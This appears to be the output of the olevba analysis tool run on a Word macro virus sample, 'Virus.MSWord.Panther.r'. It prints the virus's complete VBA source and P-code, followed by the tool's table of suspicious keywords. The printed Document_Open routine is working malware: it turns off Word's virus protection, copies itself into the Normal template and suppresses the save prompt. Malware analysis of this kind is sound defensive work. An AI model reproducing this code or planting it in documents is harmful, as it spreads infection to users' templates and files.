olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Panther.r
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Panther.r - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()

End Sub

Private Sub Document_New()
ÐÏà¡±á











































°Š#�7$�M%°


ð\x08
ð\x08

ð
ð\x08
















r



End Sub

Private Sub Document_Open()
    Dim code As String
    If Left$(NormalTemplate.Name, 8) <> "Document" Then
        Options.VirusProtection = False
        With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
            code = .Lines(1, .CountOfLines)
            ReplaceTemplate code, "Normal", "Template", "Happy", "Panther"
            ReplaceTemplate code, "Active", "Document", "Normal", "Template"
            ReplaceTemplate code, "Happy", "Panther", "Active", "Document"
            With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
                .DeleteLines 1, .CountOfLines
                .AddFromString code
            End With
        End With
        Options.SaveNormalPrompt = False
       End If
End Sub
Private Sub ReplaceTemplate(target As String, prepre As String, prepost As String, postpre As String, postpost As String)
    Dim index As Long, pre As String, post As String, preLen As Long
    
    pre = prepre + prepost
    post = postpre + postpost
    
    index = 1
    preLen = Len(pre)
    
    While InStr(index, target, pre) <> 0
        index = InStr(index, target, pre)
        target = Left(target, index - 1) + post + Mid$(target, index + preLen)
        index = index + 1
    Wend
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Panther.r
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4267 bytes
' Line #0:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #1:
' Line #2:
' 	EndSub 
' Line #3:
' Line #4:
' 	FuncDefn (Private Sub Document_New())
' Line #5:
' 	Reparse 0x0008 "ÐÏà¡±á"
' Line #6:
' 	Reparse 0x0001 ""
' Line #7:
' 	Reparse 0x0001 ""
' Line #8:
' 	Reparse 0x0001 ""
' Line #9:
' 	Reparse 0x0001 ""
' Line #10:
' 	Reparse 0x0001 ""
' Line #11:
' 	Reparse 0x0001 ""
' Line #12:
' 	Reparse 0x0001 ""
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' 	Reparse 0x0001 ""
' Line #45:
' Line #46:
' Line #47:
' Line #48:
' Line #49:
' 	Reparse 0x000D "°Š#�7$�M%°"
' Line #50:
' Line #51:
' Line #52:
' 	Reparse 0x0002 "ð\x08"
' Line #53:
' 	Reparse 0x0002 "ð\x08"
' Line #54:
' Line #55:
' 	Reparse 0x0002 "ð"
' Line #56:
' 	Reparse 0x0002 "ð\x08"
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' 	ArgsCall r 0x0000 
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' 	EndSub 
' Line #78:
' Line #79:
' 	FuncDefn (Private Sub Document_Open())
' Line #80:
' 	Dim 
' 	VarDefn code (As String)
' Line #81:
' 	Ld NormalTemplate 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #82:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #83:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #84:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemLdWith Lines 0x0002 
' 	St code 
' Line #85:
' 	Ld code 
' 	LitStr 0x0006 "Normal"
' 	LitStr 0x0008 "Template"
' 	LitStr 0x0005 "Happy"
' 	LitStr 0x0007 "Panther"
' 	ArgsCall ReplaceTemplate 0x0005 
' Line #86:
' 	Ld code 
' 	LitStr 0x0006 "Active"
' 	LitStr 0x0008 "Document"
' 	LitStr 0x0006 "Normal"
' 	LitStr 0x0008 "Template"
' 	ArgsCall ReplaceTemplate 0x0005 
' Line #87:
' 	Ld code 
' 	LitStr 0x0005 "Happy"
' 	LitStr 0x0007 "Panther"
' 	LitStr 0x0006 "Active"
' 	LitStr 0x0008 "Document"
' 	ArgsCall ReplaceTemplate 0x0005 
' Line #88:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #89:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #90:
' 	Ld code 
' 	ArgsMemCallWith AddFromString 0x0001 
' Line #91:
' 	EndWith 
' Line #92:
' 	EndWith 
' Line #93:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	EndSub 
' Line #96:
' 	FuncDefn (Private Sub ReplaceTemplate(target As String, prepre As String, prepost As String, postpre As String, postpost As String))
' Line #97:
' 	Dim 
' 	VarDefn index (As Long)
' 	VarDefn pre (As String)
' 	VarDefn post (As String)
' 	VarDefn preLen (As Long)
' Line #98:
' Line #99:
' 	Ld prepre 
' 	Ld prepost 
' 	Add 
' 	St pre 
' Line #100:
' 	Ld postpre 
' 	Ld postpost 
' 	Add 
' 	St post 
' Line #101:
' Line #102:
' 	LitDI2 0x0001 
' 	St index 
' Line #103:
' 	Ld pre 
' 	FnLen 
' 	St preLen 
' Line #104:
' Line #105:
' 	Ld index 
' 	Ld target 
' 	Ld pre 
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	While 
' Line #106:
' 	Ld index 
' 	Ld target 
' 	Ld pre 
' 	FnInStr3 
' 	St index 
' Line #107:
' 	Ld target 
' 	Ld index 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld post 
' 	Add 
' 	Ld target 
' 	Ld index 
' 	Ld preLen 
' 	Add 
' 	ArgsLd Mid$$ 0x0002 
' 	Add 
' 	St target 
' Line #108:
' 	Ld index 
' 	LitDI2 0x0001 
' 	Add 
' 	St index 
' Line #109:
' 	Wend 
' Line #110:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|'\x08'              |May use special characters such as backspace |
|          |                    |to obfuscate code when printed on the console|
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

